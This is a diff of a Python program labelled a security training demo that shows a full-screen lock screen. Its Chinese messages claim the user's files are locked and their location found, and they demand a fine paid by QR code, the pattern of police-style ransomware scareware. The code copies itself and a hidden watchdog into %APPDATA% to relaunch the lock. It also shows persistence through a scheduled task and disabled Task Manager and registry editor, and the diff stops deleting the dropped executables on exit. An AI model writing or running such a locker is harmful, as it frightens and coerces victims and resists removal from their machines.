@@ -52,39 +52,29 @@ def init_log():
         os.makedirs(log_dir, exist_ok=True)
         log_path = os.path.join(log_dir, f'SecurityDemo_{datetime.now().strftime("%Y%m%d")}.log')
         _log_file = open(log_path, 'a', encoding='utf-8')
-        # 写入一条分隔线
         _log_file.write(f"\n{'='*60}\n")
         _log_file.write(f"日志开始: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
         _log_file.flush()
     except Exception as e:
-        # 若文件打开失败，降级为仅控制台
         print(f"[警告] 无法创建日志文件: {e}")
         _log_file = None
 
 def log(msg, console=None):
-    """
-    写入日志：
-      - 若 console 未指定，自动判断：包含 '✅' 或 '❌' 则仅写文件，不打印控制台
-      - 否则打印到控制台并写入文件
-    """
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     full_msg = f"[{timestamp}] {msg}"
-    # 写入文件
     if _log_file:
         try:
             _log_file.write(full_msg + '\n')
             _log_file.flush()
         except:
             pass
-    # 决定是否打印到控制台
     if console is None:
-        # 自动判断：若含有操作符号，则默认不打印到控制台
         console = not ('✅' in msg or '❌' in msg)
     if console:
         print(full_msg)
 
 # ============================================================
-# 配置 【仅调大面板尺寸，其余颜色常量保持原样】
+# 配置
 # ============================================================
 WINDOW_BG = "#050505"
 PANEL_WIDTH = 1280
@@ -133,7 +123,6 @@ def get_current_time():
     return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
 def is_admin():
-    """检测当前进程是否以管理员权限运行（仅Windows）"""
     try:
         import ctypes
         return ctypes.windll.shell32.IsUserAnAdmin() != 0
@@ -268,7 +257,7 @@ class WindowsPersistence:
             pass
 
 # ============================================================
-# 【修复版】释放并启动 watchdog（解决onefile _MEIPASS销毁问题）
+# 释放并启动 watchdog（增强版：记录PID，便于退出时清理）
 # ============================================================
 def release_and_launch_watchdog():
     """释放内嵌的 watchdog.exe 到 %APPDATA%\SecurityDemo 持久目录并启动，返回是否成功"""
@@ -317,41 +306,66 @@ def release_and_launch_watchdog():
             log("错误：watchdog.exe复制后大小不匹配，文件损坏", console=False)
             return False
 
-        # ==========关键修复：复制自身到持久目录，watchdog监控副本，规避_MEIPASS删除==========
+        # 复制自身到持久目录（watchdog监控副本，规避_MEIPASS删除）
         main_exe_src = sys.executable
         main_exe_dst = os.path.join(target_dir, "main.exe")
-        log(f"复制主程序自身到持久目录 {main_exe_dst}", console=False)
         src_main_size = os.path.getsize(main_exe_src)
         if not (os.path.exists(main_exe_dst) and os.path.getsize(main_exe_dst) == src_main_size):
             shutil.copy(main_exe_src, main_exe_dst)
             log("主程序副本复制完成", console=False)
 
         launch_target_exe = main_exe_dst
-        # ==========end==========
 
         # 构造 watchdog 启动参数
         cmd = [target_watchdog, '--target', launch_target_exe]
         if '--persist' in sys.argv or '-p' in sys.argv:
             cmd.append('--persist')
 
-        subprocess.Popen(
+        proc = subprocess.Popen(
             cmd,
             creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0,
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL
         )
-        log("✅ watchdog 已成功启动，主进程准备退出", console=False)
+        # 记录watchdog PID，便于退出时清理
+        pid_file = os.path.join(target_dir, "watchdog.pid")
+        with open(pid_file, 'w') as f:
+            f.write(str(proc.pid))
+        log(f"✅ watchdog 已启动 (PID={proc.pid})，主进程准备退出", console=False)
         return True
 
     except Exception as e:
         log(f"❌ release_and_launch_watchdog 异常: {str(e)}", console=False)
         return False
 
+def kill_watchdog():
+    """尝试根据PID文件终止watchdog进程"""
+    appdata = os.getenv("APPDATA")
+    if not appdata:
+        return
+    pid_file = os.path.join(appdata, "SecurityDemo", "watchdog.pid")
+    if not os.path.exists(pid_file):
+        return
+    try:
+        with open(pid_file, 'r') as f:
+            pid = int(f.read().strip())
+        if pid > 0:
+            import signal
+            os.kill(pid, signal.SIGTERM)
+            time.sleep(0.5)
+            # 尝试强制杀
+            try:
+                os.kill(pid, signal.SIGKILL)
+            except:
+                pass
+            log(f"已尝试终止watchdog进程 (PID={pid})", console=False)
+    except Exception as e:
+        log(f"终止watchdog失败: {e}", console=False)
+
 # ============================================================
-# 获取资源文件路径（兼容开发环境和打包环境）
+# 获取资源文件路径
 # ============================================================
 def resource_path(relative_path):
-    """获取资源的绝对路径，支持 PyInstaller 打包"""
     try:
         base_path = sys._MEIPASS
     except Exception:
@@ -364,7 +378,7 @@ def resource_path(relative_path):
 class SecurityDemoUI:
     def __init__(self, enable_persistence=False):
         self.enable_persistence = enable_persistence and WindowsPersistence.is_windows()
-        self.is_admin = is_admin()  # 检测管理员权限
+        self.is_admin = is_admin()
         self.root = tk.Tk()
         self.root.title("")
         self.root.configure(bg=WINDOW_BG)
@@ -386,7 +400,6 @@ class SecurityDemoUI:
         self.exit_count = 0
         self.last_exit_press = 0
 
-        # 启动信息输出到控制台（同时写入文件）
         log("======================================")
         log(f"启动时间：{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
         log(f"本机 IP：{self.local_ip}")
@@ -394,28 +407,21 @@ class SecurityDemoUI:
         log("您的所在位置：已确定")
         log("计算机所有文件：已锁定")
         log("罚款支付：扫描二维码")
-        log(f"进程守护：{'启用' if self.enable_persistence else '禁用'}")
+        log(f"粘性功能：{'启用' if self.enable_persistence else '禁用'}")
         log(f"管理员权限：{'是' if self.is_admin else '否'}")
 
-        # 构建 UI
         self.build_gui()
-        # 启动实时更新
         self.update_live_info()
         self.update_countdown()
-        # 绑定退出快捷键（仅 Ctrl+Shift+Q）
         self.root.bind("<Control-Shift-Q>", self.exit_shortcut)
         self.root.bind("<Control-Shift-q>", self.exit_shortcut)
-        # 应用粘性
         if self.enable_persistence:
             self.apply_persistence()
-        # 窗口关闭事件（清理）
         self.root.protocol("WM_DELETE_WINDOW", self.safe_exit)
 
     def build_gui(self):
-        # 主背景
         bg = tk.Frame(self.root, bg=WINDOW_BG)
         bg.pack(fill="both", expand=True)
-        # 中央面板
         panel_x = (self.screen_width - PANEL_WIDTH) // 2
         panel_y = (self.screen_height - PANEL_HEIGHT) // 2
         self.panel = tk.Frame(
@@ -425,11 +431,8 @@ class SecurityDemoUI:
             highlightthickness=6
         )
         self.panel.place(x=panel_x, y=panel_y, width=PANEL_WIDTH, height=PANEL_HEIGHT)
-        # 顶部区域（徽章 + 状态）
         self.create_top()
-        # 主体区域
         self.create_body()
-        # 左下角标识
         tk.Label(
             self.root,
             text=f"SECURITY TRAINING DEMO    ID: {self.demo_id}",
@@ -441,7 +444,6 @@ class SecurityDemoUI:
     def create_top(self):
         top = tk.Frame(self.panel, bg=WHITE)
         top.place(x=24, y=24, width=PANEL_WIDTH - 48, height=210)
-        # --- 左侧徽章（支持图片，若图片不存在则绘制五角星） ---
         badge_container = tk.Frame(top, bg=WHITE, width=190, height=190)
         badge_container.place(x=8, y=4)
         badge_img_path = resource_path("badge.png")
@@ -462,7 +464,7 @@ class SecurityDemoUI:
             else:
                 log("⚠️ badge.png 未找到，使用五角星", console=False)
             self._draw_star_badge(badge_container)
-        # --- 右侧状态框 ---
+
         self.status_box = tk.Frame(top, bg=GRAY, relief="solid", bd=1)
         self.status_box.place(x=820, y=12, width=390, height=182)
         self.ip_value = self._create_status_row(0, "本机 IP：", self.local_ip, GREEN)
@@ -630,21 +632,9 @@ class SecurityDemoUI:
         WindowsPersistence.remove_scheduled_task()
         WindowsPersistence.enable_taskmgr()
         WindowsPersistence.enable_regedit()
-
-        # 清理APPDATA目录下生成的watchdog与main副本
-        appdata = os.getenv("APPDATA")
-        if appdata:
-            target_dir = os.path.join(appdata, "SecurityDemo")
-            try:
-                watchdog_path = os.path.join(target_dir, "watchdog.exe")
-                main_copy = os.path.join(target_dir, "main.exe")
-                if os.path.exists(watchdog_path):
-                    os.remove(watchdog_path)
-                if os.path.exists(main_copy):
-                    os.remove(main_copy)
-            except Exception as e:
-                log(f"清理副本文件异常 {e}", console=False)
-        log("✅ 清理完成", console=False)
+        # 注意：不删除 %APPDATA%\SecurityDemo 下的 main.exe 和 watchdog.exe，
+        # 因为它们是持久化副本，下次启动仍会使用，且删除正在运行的文件会报错。
+        log("✅ 清理完成（注册表/计划任务已清除，文件副本保留）", console=False)
 
     def exit_shortcut(self, event=None):
         now = time.time()
@@ -660,6 +650,8 @@ class SecurityDemoUI:
         log("正在安全退出...")
         if self.enable_persistence:
             self.cleanup_persistence()
+        # 尝试终止watchdog进程（避免孤儿进程）
+        kill_watchdog()
         self.root.destroy()
         log("程序已退出")
         global _log_file
